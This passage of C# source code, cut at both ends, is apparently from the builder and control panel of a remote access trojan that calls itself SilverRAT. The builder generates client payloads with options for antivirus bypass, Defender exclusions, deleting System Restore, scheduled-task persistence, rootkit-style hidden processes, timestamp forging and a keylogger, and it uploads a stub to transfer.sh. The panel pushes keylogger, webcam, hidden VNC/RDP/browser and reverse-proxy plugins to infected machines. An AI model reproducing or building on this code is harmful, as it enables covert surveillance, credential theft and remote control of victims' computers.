        string result3 = " /create /sc weekly /d SUN /tn \"\"%Mytask%-WEEKLY-01\"\" /tr \"\"%MyFile%\"\" /st 10:00";
        if (ComDownTasks.SelectedIndex == 0)
        {
            return result;
        }
        if (ComDownTasks.SelectedIndex == 1)
        {
            return result2;
        }
        if (ComDownTasks.SelectedIndex == 2)
        {
            return result3;
        }
        return result2;
    }

    private string GetExctenstion()
    {
        if (EXE.Checked)
        {
            return "Executable .exe |*.exe";
        }
        if (CMD.Checked)
        {
            return "Executable .cmd |*.cmd";
        }
        if (PIF.Checked)
        {
            return "Executable .pif |*.pif";
        }
        if (COM.Checked)
        {
            return "Executable .com |*.com";
        }
        if (SCR.Checked)
        {
            return "Executable .scr |*.scr";
        }
        return "Executable .exe |*.exe";
    }

    private string BuilderGetExctenstion()
    {
        if (EXE.Checked)
        {
            return ".exe";
        }
        if (CMD.Checked)
        {
            return ".cmd";
        }
        if (PIF.Checked)
        {
            return ".pif";
        }
        if (COM.Checked)
        {
            return ".com";
        }
        if (SCR.Checked)
        {
            return ".scr";
        }
        return ".exe";
    }

    private string GetInstallationMethod()
    {
        string result = "Templates";
        if (BuilderUserProfile.Checked)
        {
            return "UserProfile";
        }
        if (BuilderApplicationData.Checked)
        {
            return "ApplicationData";
        }
        if (BuilderTemplates.Checked)
        {
            return result;
        }
        return result;
    }

    private void Build_Click(object sender, EventArgs e)
    {
        try
        {
            if (string.IsNullOrEmpty(BuilderKey.Text))
            {
                Notifiecation.Show("Builder!", "Please enter Connection Password", Resources.Alert, Color.FromArgb(248, 189, 9));
                return;
            }
            if (string.IsNullOrEmpty(BuilderHost.Text))
            {
                Notifiecation.Show("Builder!", "Please enter your DNS or IP", Resources.Alert, Color.FromArgb(248, 189, 9));
                return;
            }
            if (string.IsNullOrEmpty(BuilderPort.Text))
            {
                Notifiecation.Show("Builder!", "Please enter your Port", Resources.Alert, Color.FromArgb(248, 189, 9));
                return;
            }
            if (BuilderInstallation.Checked)
            {
                if (string.IsNullOrEmpty(BuilderProcessName.Text))
                {
                    Notifiecation.Show("Builder!", "Please enter your Process name", Resources.Alert, Color.FromArgb(248, 189, 9));
                    return;
                }
                if (string.IsNullOrEmpty(Foldername.Text))
                {
                    Notifiecation.Show("Builder!", "Please enter your Folder name", Resources.Alert, Color.FromArgb(248, 189, 9));
                    return;
                }
            }
            if (EnabledDiscord.Checked && string.IsNullOrEmpty(bunifuTextBox_0.Text))
            {
                Notifiecation.Show("Builder!", "Please enter your WebHooks {URL} - Discord", Resources.Alert, Color.FromArgb(248, 189, 9));
                return;
            }
            StupSetup = Methods.GetRandomString(15);
            StupProgram = Methods.GetRandomString(16);
            StupMain = Methods.GetRandomString(17);
            if (BaypassAV.Checked)
            {
                if (!File.Exists(OutputDll))
                {
                    Directory.CreateDirectory(OutputDll);
                }
                OutputDll = OutputDll + "\\" + Methods.GetRandomString(15);
            }
            SaveFileDialog saveFileDialog = new SaveFileDialog
            {
                Filter = GetExctenstion(),
                InitialDirectory = Application.StartupPath,
                FileName = Payloadname.Text
            };
            if (saveFileDialog.ShowDialog() != DialogResult.OK)
            {
                return;
            }
            try
            {
                OutputPayload = saveFileDialog.FileName;
                Build.Enabled = false;
                Build.Text = "Please wait...";
                Dictionary<string, string> providerOptions = new Dictionary<string, string> { { "CompilerVersion", "v4.0" } };
                CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider(providerOptions);
                CompilerParameters compilerParameters = new CompilerParameters();
                string text = " /target:winexe /platform:x64 /optimize ";
                if (!string.IsNullOrEmpty(BuilderIconPath))
                {
                    text = text + " /win32icon:\"" + BuilderIconPath + "\"";
                }
                compilerParameters.ReferencedAssemblies.Add("System.dll");
                compilerParameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
                compilerParameters.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll");
                if (DeleteSystemRestore.Checked)
                {
                    compilerParameters.ReferencedAssemblies.Add("System.Management.dll");
                }
                compilerParameters.GenerateExecutable = true;
                compilerParameters.OutputAssembly = (BaypassAV.Checked ? OutputDll : OutputPayload);
                compilerParameters.CompilerOptions = ((EXE.Checked || SCR.Checked) ? text : null);
                compilerParameters.IncludeDebugInformation = false;
                if (string.IsNullOrEmpty(Settings.Value))
                {

                }
                StringBuilder stringb = new StringBuilder(Settings.Value);
                ReplaceGlobals(ref stringb);
                CompilerResults compilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, stringb.ToString());
                if (compilerResults.Errors.Count > 0)
                {
                    foreach (CompilerError error in compilerResults.Errors)
                    {
                        Notifiecation.Show("Builder!", error.ToString(), Resources.ErrorNotif, Color.FromArgb(204, 102, 90));
                    }
                    Build.Enabled = true;
                    Build.Text = "Build";
                    MesgBuilder(Value: false, "Failed!\n Message : An unexpected error occurred! Try again");
                    return;
                }
                if (BaypassAV.Checked)
                {
                    if (CompilerAV())
                    {
                        MesgBuilder(Value: true, "Built successfully\nPath : " + OutputPayload + "\nSize : " + Methods.BytesToString(File.ReadAllBytes(OutputPayload).Length));
                    }
                    else
                    {
                        MesgBuilder(Value: false, "Failed!\n Message : An unexpected error occurred! Try again");
                    }
                    return;
                }
                if (!BaypassAV.Checked && BuilderDatemodified.Checked)
                {
                    File.SetCreationTime(OutputPayload, bunifuDatePicker1.Value);
                }
                File.SetLastWriteTime(OutputPayload, bunifuDatePicker1.Value);
                File.SetLastAccessTime(OutputPayload, bunifuDatePicker1.Value);
                if (SaveSettings.Checked)
                {
                    SaveProfilBuilder();
                }
                MesgBuilder(Value: true, "Built successfully\nPath : " + compilerResults.PathToAssembly + "\nSize : " + Methods.BytesToString(File.ReadAllBytes(compilerResults.PathToAssembly).Length));
            }
            catch
            {

            }
        }
        catch
        {

        }
    }

    public void ReplaceGlobals(ref StringBuilder stringb)
    {
        try
        {
            if (!Methods.InternetState())
            {
                MessageBox.Show(this, "Please check internet connection!", "SilverRAT | Builder!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }
            Settings.ServerCertificate = new X509Certificate2(Settings.CertificatePath);
            string text = BuilderKey.Text;
            new Aes256(text);

            byte[] inArray;
            using (RSACryptoServiceProvider rSACryptoServiceProvider = (RSACryptoServiceProvider)Settings.ServerCertificate.PrivateKey)
            {
                byte[] rgbHash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(text));
                inArray = rSACryptoServiceProvider.SignHash(rgbHash, CryptoConfig.MapNameToOID("SHA256"));
            }
            if (BaypassAV.Checked)
            {
                stringb.Replace("BypassAV", "true");
                stringb.Replace("%Invoki%", StupMain);
            }
            stringb.Replace("%Setup%", StupSetup);
            stringb.Replace("%Program%", StupProgram);
            stringb.Replace("%Key%", Convert.ToBase64String(Encoding.UTF8.GetBytes(text)));
            stringb.Replace("%Serversignature%", Convert.ToBase64String(inArray));

            stringb.Replace("%Group%", BuilderGroup.Text);
            stringb.Replace("%Mtx%", BuilderProcessMutex.Text);

            if (HostDefault.Checked)
            {
                stringb.Replace("%Hosts%", Encrypt.EncryptTxt(BuilderHost.Text, "0x49,0x76,0x61,10,0x20,0x4D,0x65,100,0x76,0x65,100,0x65,0x76"));
                stringb.Replace("%Ports%", Encrypt.EncryptTxt(BuilderPort.Text, "0x49,0x76,0x61,10,0x20,0x4D,0x65,100,0x76,0x65,100,0x65,0x76"));
                stringb.Replace("DNSNormal", "true");
            }
            else
            {
                stringb.Replace("PastebinDNS", "true").Replace("%URLPastebin%", BuilderHost.Text);
                stringb.Replace("%Hosts%", "******");
                stringb.Replace("%Ports%", "******");
            }
            if (BuilderDelay.Checked)
            {
                stringb.Replace("Executiondelay", "true").Replace("%DelayCount%", BuilderExcutionDelay.Text);
            }
            if (BuilderDelayConnect.Checked)
            {
                stringb.Replace("%ReconnectDelay%", BuilderReconnectDelay.Text);
            }
            else
            {
                stringb.Replace("%ReconnectDelay%", BuilderReconnectDelay.Text);
            }
            if (BuilderInstallation.Checked)
            {
                string text2 = ((!HiddenProcess.Checked) ? "" : "$77");
                stringb.Replace("AddInstalla", "true").Replace("%Method%", GetInstallationMethod()).Replace("%Folder%", Foldername.Text)
                    .Replace("%Payload%", text2 + BuilderProcessName.Text + BuilderGetExctenstion());
                stringb.Replace("%IStateInstallD%", "true");
                if (BuilderBloackAccessPath.Checked)
                {
                    stringb.Replace("DefAddFolderSecurity", "true");
                }
                if (BuilderHiddenInstall.Checked)
                {
                    stringb.Replace("DefHidden", "true");
                }
                if (AutoStartup.Checked)
                {
                    stringb.Replace("DefAutoStart", "true");
                }
                if (HiddenProcess.Checked)
                {
                    stringb.Replace("Rootikt", "true");
                }
            }
            else
            {
                stringb.Replace("%IStateInstallD%", "false");
            }
            if (DeleteSystemRestore.Checked)
            {
                stringb.Replace("DefDeleteSystemRestore", "true");
            }
            if (BuilderCreateTask.Checked)
            {
                stringb.Replace("DefCreateTask", "true").Replace("%Commaent%", GetDownDropTask().Replace("%Mytask%", BuilderProcessName.Text + "_Task"));
            }
            if (bunifuCheckBox_0.Checked)
            {
                stringb.Replace("DefUAC", "true");
            }
            if (BuilderDefender.Checked)
            {
                stringb.Replace("DefDefenderException", "true");
            }
            if (keyloggerOfflien.Checked)
            {
                stringb.Replace("KeyloaggrOfflien", "true");
            }
            if (EnabledDiscord.Checked)
            {
                stringb.Replace("IsDiscordNotif", "true");
                stringb.Replace("%HeyMesg%", Logger.auth_sample.user_data.username);
                stringb.Replace("%ServerDiscord%", Encrypt.EncryptTxt(bunifuTextBox_0.Text, "0x49,0x76,0x61,10,0x20,0x4D,0x65,100,0x76,0x65,100,0x65,0x76"));

                if (EnabledRecoveryData.Checked)
                {
                    stringb.Replace("IsRecoveryData", "true");

                }
            }
            if (HiddenProcess.Checked || !HostDefault.Checked || EnabledRecoveryData.Checked)
            {
                stringb.Replace("IsInternetState", "true");
            }
            if (BuilderAssemblyinformation.Checked)
            {
                stringb.Replace("DefAssembly", "true");
                stringb.Replace("%Title%", BuilderTitleAssembly.Text);
                stringb.Replace("%Description%", BuilderDescriptionsAssembly.Text);
                stringb.Replace("%Company%", BuilderCompanyAssembly.Text);
                stringb.Replace("%Product%", BuilderCompanyAssembly.Text);
                stringb.Replace("%Copyright%", BuilderCopyrightAssembly.Text);
                stringb.Replace("%Trademark%", BuilderTrademarksAssembly.Text);
                stringb.Replace("%v1%", Vr1.Text);
                stringb.Replace("%v2%", Vr2.Text);
                stringb.Replace("%v3%", Vr3.Text);
                stringb.Replace("%v4%", Vr4.Text);
            }
        }
        catch
        {
        }
    }

    public bool CompilerAV()
    {
        try
        {
            if (!StateAV)
            {
                return false;
            }
            Dictionary<string, string> providerOptions = new Dictionary<string, string> { { "CompilerVersion", "v4.0" } };
            CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider(providerOptions);
            CompilerParameters compilerParameters = new CompilerParameters();
            string text = " /target:winexe /platform:x64 /optimize ";
            if (!string.IsNullOrEmpty(BuilderIconPath))
            {
                text = text + " /win32icon:\"" + BuilderIconPath + "\"";
            }
            compilerParameters.ReferencedAssemblies.Add("System.dll");
            compilerParameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            compilerParameters.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll");
            compilerParameters.ReferencedAssemblies.Add("System.Drawing.dll");
            compilerParameters.ReferencedAssemblies.Add("System.Management.dll");
            compilerParameters.ReferencedAssemblies.Add("System.IO.dll");
            compilerParameters.ReferencedAssemblies.Add("System.IO.compression.dll");
            compilerParameters.ReferencedAssemblies.Add("System.IO.compression.filesystem.dll");
            compilerParameters.ReferencedAssemblies.Add("System.Core.dll");
            compilerParameters.ReferencedAssemblies.Add("System.Security.dll");
            compilerParameters.ReferencedAssemblies.Add("System.Net.Http.dll");
            compilerParameters.ReferencedAssemblies.Add("System.Xml.dll");
            if (DeleteSystemRestore.Checked)
            {
                compilerParameters.ReferencedAssemblies.Add("System.Management.dll");
            }
            compilerParameters.GenerateExecutable = true;
            compilerParameters.OutputAssembly = OutputPayload;
            compilerParameters.CompilerOptions = ((EXE.Checked || SCR.Checked) ? text : null);
            compilerParameters.IncludeDebugInformation = false;
            StringBuilder stringb = new StringBuilder(Resources.StubAV);
            ReplaceGlobalsAV(ref stringb);
            CompilerResults compilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, stringb.ToString());
            if (compilerResults.Errors.Count > 0)
            {
                return false;
            }
            if (BuilderDatemodified.Checked)
            {
                File.SetCreationTime(OutputPayload, bunifuDatePicker1.Value);
                File.SetLastWriteTime(OutputPayload, bunifuDatePicker1.Value);
                File.SetLastAccessTime(OutputPayload, bunifuDatePicker1.Value);
            }
            return true;
        }
        catch
        {
            return false;
        }
    }

    public bool UploadClient()
    {
        try
        {
            if (File.Exists(OutputDll))
            {
                Invoke((MethodInvoker)delegate
                {
                    UrlAV = Methods.AsyncUpload(OutputDll);
                });
                try
                {
                    if (File.Exists(OutputDll))
                    {
                        File.Delete(OutputDll);
                    }
                }
                catch
                {
                }
                if (!UrlAV.Contains("https://transfer.sh/"))
                {
                    return false;
                }
                return true;
            }
            return false;
        }
        catch
        {
            return false;
        }
    }

    public void ReplaceGlobalsAV(ref StringBuilder stringb)
    {
        try
        {
            if (UploadClient())
            {
                StateAV = true;

                stringb.Replace("%Setup%", StupSetup);
                stringb.Replace("%Program%", StupProgram);
                stringb.Replace("%Invoki%", StupMain);
                if (BuilderAssemblyinformation.Checked)
                {
                    stringb.Replace("DefAssembly", "true");
                    stringb.Replace("%Title%", BuilderTitleAssembly.Text);
                    stringb.Replace("%Description%", BuilderDescriptionsAssembly.Text);
                    stringb.Replace("%Company%", BuilderCompanyAssembly.Text);
                    stringb.Replace("%Product%", BuilderCompanyAssembly.Text);
                    stringb.Replace("%Copyright%", BuilderCopyrightAssembly.Text);
                    stringb.Replace("%Trademark%", BuilderTrademarksAssembly.Text);
                    stringb.Replace("%v1%", Vr1.Text);
                    stringb.Replace("%v2%", Vr2.Text);
                    stringb.Replace("%v3%", Vr3.Text);
                    stringb.Replace("%v4%", Vr4.Text);
                }
                StateAV = true;
            }
            else
            {
                StateAV = false;
            }
        }
        catch
        {
            StateAV = false;
        }
    }

    public void MesgBuilder(bool Value, string str)
    {
        if (Value)
        {
            Notifiecation.Show("Builder", str, Resources.SuccessNotif, Color.FromArgb(103, 185, 108));
        }
        else
        {
            Notifiecation.Show("Builder!", str, Resources.ErrorNotif, Color.FromArgb(204, 102, 90));
        }
        Build.Enabled = true;
        Build.Text = "Build";
    }

    private void BuilderDelayConnect_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        if (BuilderDelayConnect.Checked)
        {
            PanelReDelay.Enabled = true;
        }
        else
        {
            PanelReDelay.Enabled = false;
        }
    }

    private void BuilderCreateTask_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        if (BuilderCreateTask.Checked)
        {
            PanelTask.Enabled = true;
        }
        else
        {
            PanelTask.Enabled = false;
        }
    }

    private void BuilderDelay_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        if (BuilderDelay.Checked)
        {
            PanelDelay.Enabled = true;
        }
        else
        {
            PanelDelay.Enabled = false;
        }
    }

    private void BuilderExcutionDelay_KeyDown(object sender, KeyEventArgs e)
    {
        if (e.KeyCode == Keys.Back)
        {
            e.SuppressKeyPress = true;
        }
    }

    private void BuilderExcutionDelay_KeyPress(object sender, KeyPressEventArgs e)
    {
        if (!char.IsNumber(e.KeyChar) & !char.IsControl(e.KeyChar))
        {
            e.Handled = true;
        }
    }

    private void BuilderProcessMutex_OnIconRightClick(object sender, EventArgs e)
    {
        BuilderProcessMutex.Text = "SilverMutex_" + Methods.GetRandomString(10);
    }

    private void BuilderKey_OnIconRightClick(object sender, EventArgs e)
    {
        BuilderKey.Text = Methods.GetRandomString(30);
    }

    private void ClearListLogs_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
    {
        LogsList.Rows.Clear();
    }

    private void ScanTitle_OnIconRightClick(object sender, EventArgs e)
    {
        if (ScanTitle.Text.Length == 0)
        {
            Notifiecation.Show("SilverRAT | Monitor!", "Please enter Title", Resources.Alert, Color.FromArgb(248, 189, 9));
            return;
        }
        foreach (DataGridViewRow item in (IEnumerable)ListScanActiveAddresses.Rows)
        {
            if (!item.IsNewRow && ScanTitle.Text == item.Cells[0].Value.ToString())
            {
                Notifiecation.Show("SilverRAT | Monitor!", "This title is already added", Resources.InfoNotif, Color.FromArgb(52, 152, 219));
                return;
            }
        }
        ListScanActiveAddresses.Rows.Add(ScanTitle.Text);
        ScanTitle.Clear();
    }

    private void ScanTitle_OnIconLeftClick(object sender, EventArgs e)
    {
        try
        {
            foreach (DataGridViewRow selectedRow in ListScanActiveAddresses.SelectedRows)
            {
                ListScanActiveAddresses.Rows.Remove(selectedRow);
            }
        }
        catch
        {
        }
    }

    private void DelayMonitor_KeyDown(object sender, KeyEventArgs e)
    {
        if (e.KeyCode == Keys.Back)
        {
            e.SuppressKeyPress = true;
        }
    }

    private void DelayMonitor_KeyPress(object sender, KeyPressEventArgs e)
    {
        if (!char.IsNumber(e.KeyChar) & !char.IsControl(e.KeyChar))
        {
            e.Handled = true;
        }
    }

    private void EnableLogo_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        if (EnableLogo.Checked)
        {
            ClientsList.Columns[0].Visible = true;
        }
        else
        {
            ClientsList.Columns[0].Visible = false;
        }
    }

    private void EnableID_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        if (EnableID.Checked)
        {
            ClientsList.Columns[2].Visible = true;
        }
        else
        {
            ClientsList.Columns[2].Visible = false;
        }
    }

    private void EnableIP_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        if (EnableIP.Checked)
        {
            ClientsList.Columns[3].Visible = true;
        }
        else
        {
            ClientsList.Columns[3].Visible = false;
        }
    }

    private void EnableFlag_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        if (EnableFlag.Checked)
        {
            ClientsList.Columns[5].Visible = true;
        }
        else
        {
            ClientsList.Columns[5].Visible = false;
        }
    }

    private void EnableMonitors_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        if (EnableMonitors.Checked)
        {
            ClientsList.Columns[11].Visible = true;
        }
        else
        {
            ClientsList.Columns[11].Visible = false;
        }
    }

    private void EnablePings_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        if (EnablePings.Checked)
        {
            ClientsList.Columns[13].Visible = true;
        }
        else
        {
            ClientsList.Columns[13].Visible = false;
        }
    }

    private void EnableCountry_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        if (EnableCountry.Checked)
        {
            ClientsList.Columns[6].Visible = true;
        }
        else
        {
            ClientsList.Columns[6].Visible = false;
        }
    }

    private void EnableUsername_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        if (EnableWindowsActive.Checked)
        {
            ClientsList.Columns[14].Visible = true;
        }
        else
        {
            ClientsList.Columns[14].Visible = false;
        }
    }

    private void SearchListClient_KeyDown(object sender, KeyEventArgs e)
    {
    }

    private void ClaerListMonitor_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
    {
        try
        {
            foreach (DataGridViewRow selectedRow in LogsMonitor.SelectedRows)
            {
                LogsMonitor.Rows.Remove(selectedRow);
            }
        }
        catch
        {
        }
    }

    private void ManagerContex_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "plugin";
            msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Manager.dll");
            Clients[] selectedClients = GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                Bitmap logo = (Bitmap)clients.DGV.Cells[0].Value;
                Manager manager = (Manager)Application.OpenForms["Manager:" + clients.ID];
                if (manager == null)
                {
                    manager = new Manager
                    {
                        Name = "Manager:" + clients.ID,
                        Text = "Manager : " + clients.Ip,
                        F = this,
                        ParentClient = clients,
                        Logo = logo
                    };
                    manager.Show();
                    ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void RemoteDesktopContex_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "plugin";
            msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\RDP.dll");
            Clients[] selectedClients = GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                Bitmap logo = (Bitmap)clients.DGV.Cells[0].Value;
                RemoteDesktop remoteDesktop = (RemoteDesktop)Application.OpenForms["RDP:" + clients.ID];
                if (remoteDesktop == null)
                {
                    remoteDesktop = new RemoteDesktop
                    {
                        Name = "RDP:" + clients.ID,
                        Text = "Remote Desktop : " + clients.Ip,
                        F = this,
                        ParentClient = clients,
                        Logo = logo
                    };
                    remoteDesktop.Show();
                    ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void RemoteWindowsActiveContex_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "plugin";
            msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\RAPP.dll");
            Clients[] selectedClients = GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                Bitmap logo = (Bitmap)clients.DGV.Cells[0].Value;
                RemoteApp remoteApp = (RemoteApp)Application.OpenForms["RAPP:" + clients.ID];
                if (remoteApp == null)
                {
                    remoteApp = new RemoteApp
                    {
                        Name = "RAPP:" + clients.ID,
                        Text = "Remote Windows Active : " + clients.Ip,
                        F = this,
                        ParentClient = clients,
                        Logo = logo
                    };
                    remoteApp.Show();
                    ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void RemoteMicrophoneContex_Click(object sender, EventArgs e)
    {
        MessageBox.Show(this, "This feature is in the process of being updated and you will be notified when it is ready", "Remote Microphone!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    private void RemoteKeyloaggerContex_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "plugin";
            msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Keylogger.dll");
            Clients[] selectedClients = GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                Bitmap logo = (Bitmap)clients.DGV.Cells[0].Value;
                Keyloaggar keyloaggar = (Keyloaggar)Application.OpenForms["Keylogger:" + clients.ID];
                if (keyloaggar == null)
                {
                    keyloaggar = new Keyloaggar
                    {
                        Name = "Keylogger:" + clients.ID,
                        Text = "Keylogger : " + clients.Ip,
                        F = this,
                        ParentClient = clients,
                        Logo = logo
                    };
                    keyloaggar.Show();
                    ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void RemoteCameraContex_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "plugin";
            msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Camera.dll");
            Clients[] selectedClients = GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                Bitmap logo = (Bitmap)clients.DGV.Cells[0].Value;
                Cam cam = (Cam)Application.OpenForms["Camera:" + clients.ID];
                if (cam == null)
                {
                    cam = new Cam
                    {
                        Name = "Camera:" + clients.ID,
                        Text = "Camera : " + clients.Ip,
                        F = this,
                        ParentClient = clients,
                        Logo = logo
                    };
                    cam.Show();
                    ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void RemoteChatContex_Click(object sender, EventArgs e)
    {
        try
        {
            Clients[] selectedClients = GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                Bitmap logo = (Bitmap)clients.DGV.Cells[0].Value;
                Chat chat = (Chat)Application.OpenForms["Chat:" + clients.ID];
                if (chat == null)
                {
                    chat = new Chat
                    {
                        Name = "Chat:" + clients.ID,
                        Text = "Chat : " + clients.Ip,
                        F = this,
                        ParentClient = clients,
                        Logo = logo
                    };
                    chat.Show();
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void HiddenApplactionsContex_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "plugin";
            msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\HApps.dll");
            Clients[] selectedClients = GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                Bitmap logo = (Bitmap)clients.DGV.Cells[0].Value;
                HiddenApp hiddenApp = (HiddenApp)Application.OpenForms["HApps:" + clients.ID];
                if (hiddenApp == null)
                {
                    hiddenApp = new HiddenApp
                    {
                        Name = "HApps:" + clients.ID,
                        Text = "Hidden Applactions : " + clients.Ip,
                        F = this,
                        ParentClient = clients,
                        Logo = logo
                    };
                    hiddenApp.Show();
                    ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void HiddenBrowserContex_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "plugin";
            msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\HBrowser.dll");
            Clients[] selectedClients = GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                Bitmap logo = (Bitmap)clients.DGV.Cells[0].Value;
                HiddenBrowser hiddenBrowser = (HiddenBrowser)Application.OpenForms["HBrowser:" + clients.ID];
                if (hiddenBrowser == null)
                {
                    hiddenBrowser = new HiddenBrowser
                    {
                        Name = "HBrowser:" + clients.ID,
                        Text = "Hidden Browser : " + clients.Ip,
                        F = this,
                        ParentClient = clients,
                        Logo = logo
                    };
                    hiddenBrowser.Show();
                    ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void HiddenRDPContex_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "plugin";
            msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\HRDP.dll");
            Clients[] selectedClients = GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                Bitmap logo = (Bitmap)clients.DGV.Cells[0].Value;
                HiddenRDP hiddenRDP = (HiddenRDP)Application.OpenForms["HRDP:" + clients.ID];
                if (hiddenRDP == null)
                {
                    hiddenRDP = new HiddenRDP
                    {
                        Name = "HRDP:" + clients.ID,
                        Text = "Hidden RAP : " + clients.Ip,
                        F = this,
                        ParentClient = clients,
                        Logo = logo
                    };
                    hiddenRDP.Show();
                    ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void HiddenVNCContex_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "plugin";
            msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\HVNC.dll");
            Clients[] selectedClients = GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                Bitmap logo = (Bitmap)clients.DGV.Cells[0].Value;
                HiddenVNC hiddenVNC = (HiddenVNC)Application.OpenForms["HVNC:" + clients.ID];
                if (hiddenVNC == null)
                {
                    hiddenVNC = new HiddenVNC
                    {
                        Name = "HVNC:" + clients.ID,
                        Text = "Hidden VNC : " + clients.Ip,
                        F = this,
                        ParentClient = clients,
                        Logo = logo
                    };
                    hiddenVNC.Show();
                    ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void ReverseProxyContex_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "plugin";
            msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\ReverseProxy.dll");
            Clients[] selectedClients = GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                Bitmap logo = (Bitmap)clients.DGV.Cells[0].Value;
                ReversePeoxy reversePeoxy = (ReversePeoxy)Application.OpenForms["ReverseProxy:" + clients.ID];
                if (reversePeoxy == null)
                {
                    reversePeoxy = new ReversePeoxy
                    {
                        Name = "ReverseProxy:" + clients.ID,
                        Text = "Reverse Proxy : " + clients.Ip,
                        F = this,
                        ParentClient = clients,
                        Logo = logo
                    };
                    reversePeoxy.Show();
                    ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void InternetSpeedContex_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "plugin";
